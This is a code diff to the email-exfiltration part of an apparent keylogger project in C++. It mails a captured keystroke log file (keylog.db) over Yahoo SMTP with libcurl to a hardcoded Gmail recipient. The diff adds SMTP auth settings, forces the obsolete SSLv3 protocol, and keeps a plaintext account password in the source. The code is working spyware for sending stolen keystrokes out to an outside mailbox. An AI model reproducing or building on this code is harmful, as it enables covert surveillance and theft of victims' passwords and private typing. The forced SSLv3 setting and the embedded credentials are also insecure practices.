@@ -11,8 +11,10 @@
 
 #define FROM        "<keylogger_project_2014@yahoo.com>"
 #define TO          "<MisterYura@gmail.com>"
+#define AUTH        "keylogger_project_2014@yahoo.com"
+
 #define SUBJECT     "SMTP TLS Test 9.1"
-#define FILENAME    "keylog.txt"
+#define FILENAME    "keylog.db"
 #define URL         "smtp://smtp.mail.yahoo.com:587"
 #define USERNAME    "keylogger_project_2014@yahoo.com"
 #define PASSWORD    "hood2014"
@@ -38,14 +40,12 @@ struct fileBuf_upload_status
 
 size_t read_file()
 {
-
-
     std::string encoded_buf = get_file_contents(FILENAME);
 
 	size_t encoded_buf_len = encoded_buf.size();
 	size_t len(0),buffer_size(0);
 	int no_of_rows = (int)ceil((double)encoded_buf.size()/SEND_BUF_SIZE) ;
-	int read(0);
+	//int read(0);
 	fileBuf = new char[ADD_SIZE + no_of_rows + 1][CHARS];	//Extra row for our special character to be used in conditional statements,here ""
 											// ADD_SIZE for TO,FROM,SUBJECT,CONTENT-TYPE,CONTENT-TRANSFER-ENCODING,CONETNT-DISPOSITION and \r\n
 
@@ -70,9 +70,9 @@ size_t read_file()
 	std::string sub_encoded_buf;
 
 
-	for (; len < no_of_rows + ADD_SIZE; ++len)
+	for (; (signed) len < no_of_rows + ADD_SIZE; ++len)
 	{
-		if (pos*SEND_BUF_SIZE <= encoded_buf_len)
+		if (pos*SEND_BUF_SIZE <= (signed) encoded_buf_len)
 		{
 			sub_encoded_buf = encoded_buf.substr(pos*SEND_BUF_SIZE, SEND_BUF_SIZE);
 			pos++;
@@ -83,6 +83,8 @@ size_t read_file()
 	}
 
     strcpy(fileBuf[len],"");
+
+    return -1;
 }
 
 
@@ -124,12 +126,15 @@ int main_smtp(void)
   {
     curl_easy_setopt(curl, CURLOPT_USERNAME, USERNAME);
     curl_easy_setopt(curl, CURLOPT_PASSWORD, PASSWORD);
+
     curl_easy_setopt(curl, CURLOPT_URL, URL);
     curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
+    curl_easy_setopt(curl, CURLOPT_SSLVERSION, (long)CURL_SSLVERSION_SSLv3);
     //curl_easy_setopt(curl, CURLOPT_CAINFO, "google.pem");
     curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM);
     recipients = curl_slist_append(recipients, TO);
     curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
+    curl_easy_setopt(curl, CURLOPT_MAIL_AUTH, AUTH);
 
 	curl_easy_setopt(curl, CURLOPT_INFILESIZE, file_size);
 	curl_easy_setopt(curl, CURLOPT_READFUNCTION, fileBuf_source);
